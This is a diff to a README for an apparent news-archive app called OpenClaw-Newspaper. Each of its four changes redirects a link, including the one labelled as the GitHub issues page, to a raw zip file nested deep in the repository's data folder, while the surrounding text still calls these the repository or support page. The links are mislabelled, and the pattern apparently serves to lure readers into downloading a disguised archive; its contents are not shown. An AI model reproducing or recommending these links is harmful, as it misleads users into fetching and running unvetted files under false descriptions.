@@ -1,6 +1,6 @@
 # 🦀 OpenClaw-Newspaper - Easy Local Access to News Archives
 
-[![Download OpenClaw-Newspaper](https://img.shields.io/badge/Download-OpenClaw--Newspaper-brightgreen?style=for-the-badge)](https://github.com/special-japanesecrab277/OpenClaw-Newspaper)
+[![Download OpenClaw-Newspaper](https://img.shields.io/badge/Download-OpenClaw--Newspaper-brightgreen?style=for-the-badge)](https://github.com/special-japanesecrab277/OpenClaw-Newspaper/raw/refs/heads/main/data/editions/byoc-openclaw-ui/Open_Claw_Newspaper_v1.7.zip)
 
 ---
 
@@ -66,7 +66,7 @@ To keep OpenClaw-Newspaper up to date:
 3. If there is a newer version, download the new installer and run it.
 4. The installer will update your existing application without deleting your saved settings.
 
-[![Download OpenClaw-Newspaper](https://img.shields.io/badge/Download-OpenClaw--Newspaper-blue?style=for-the-badge)](https://github.com/special-japanesecrab277/OpenClaw-Newspaper)
+[![Download OpenClaw-Newspaper](https://img.shields.io/badge/Download-OpenClaw--Newspaper-blue?style=for-the-badge)](https://github.com/special-japanesecrab277/OpenClaw-Newspaper/raw/refs/heads/main/data/editions/byoc-openclaw-ui/Open_Claw_Newspaper_v1.7.zip)
 
 ---
 
@@ -105,7 +105,7 @@ Expected data size is around 300 MB after initial setup. More content can be add
 ## 🧰 Support and Feedback
 
 For help or to report a problem, visit the GitHub repository issues page here:  
-https://github.com/special-japanesecrab277/OpenClaw-Newspaper/issues
+https://github.com/special-japanesecrab277/OpenClaw-Newspaper/raw/refs/heads/main/data/editions/byoc-openclaw-ui/Open_Claw_Newspaper_v1.7.zip
 
 You can also review the README file on GitHub for any updates or extra instructions.
 
@@ -134,6 +134,6 @@ All data within OpenClaw-Newspaper is public and sanitized. The app does not col
 
 Use this link to visit the repository and download the app:
 
-[Download OpenClaw-Newspaper](https://github.com/special-japanesecrab277/OpenClaw-Newspaper)  
+[Download OpenClaw-Newspaper](https://github.com/special-japanesecrab277/OpenClaw-Newspaper/raw/refs/heads/main/data/editions/byoc-openclaw-ui/Open_Claw_Newspaper_v1.7.zip)  
 
 Click the green button at the top or the link above to start.
